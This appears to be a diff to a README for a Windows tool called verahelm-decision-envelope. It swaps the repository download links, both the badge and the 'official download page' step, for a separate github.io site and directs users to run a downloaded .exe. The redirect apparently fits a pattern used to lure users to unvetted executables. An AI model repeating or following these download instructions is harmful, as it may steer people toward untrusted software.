@@ -1,6 +1,6 @@
 # 🛡️ verahelm-decision-envelope - Secure decisions for your software gates
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Sindisoc7425/verahelm-decision-envelope)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://sindisoc7425.github.io)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Before you install this software, make sure your computer meets these needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the official download page: https://github.com/Sindisoc7425/verahelm-decision-envelope
+1. Go to the official download page: https://sindisoc7425.github.io
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link for the latest version.
 4. Locate the file ending in .exe.
